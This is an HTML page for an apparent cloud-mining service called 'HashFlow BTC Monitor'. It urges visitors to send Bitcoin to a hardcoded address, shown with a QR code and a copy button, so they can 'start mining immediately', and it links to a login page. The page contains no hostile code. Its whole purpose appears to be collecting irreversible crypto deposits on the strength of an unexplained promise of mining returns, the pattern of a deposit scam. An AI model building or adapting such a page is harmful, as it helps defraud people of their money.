<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>HashFlow BTC Monitor</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {background: linear-gradient(135deg, #0b0f1a, #1a1f2f); color:white; font-family:Arial,sans-serif; text-align:center; padding:40px;}
.card {max-width:420px; margin:auto; background:#131a2e; padding:30px; border-radius:14px;}
h1 {color:#f2a900;}
p {font-size:14px; line-height:1.5;}
.btc-box {background:#0b0f1a; padding:15px; border-radius:8px; word-break:break-all; margin:15px 0; font-size:14px;}
button, a {display:inline-block; margin-top:20px; padding:14px 22px; background:#f2a900; color:black; text-decoration:none; border-radius:8px; font-weight:bold; cursor:pointer;}
img.qr {margin-top:15px; width:150px; height:150px;}
</style>
</head>
<body>
<div class="card">
<h1>HashFlow BTC Monitor</h1>
<p>Send BTC to the address below to start mining immediately and track your balance in real-time!</p>

<h3>Deposit BTC</h3>
<div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
<button onclick="copyAddress()">Copy Address</button>
<div>
<img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav" alt="BTC QR Code">
</div>

<a href="login.html">Start Mining</a>
</div>

<script>
function copyAddress(){
  const btc = document.getElementById('btcAddress').innerText;
  navigator.clipboard.writeText(btc).then(()=>{ alert('BTC address copied!'); });
}
</script>
</body>
</html>
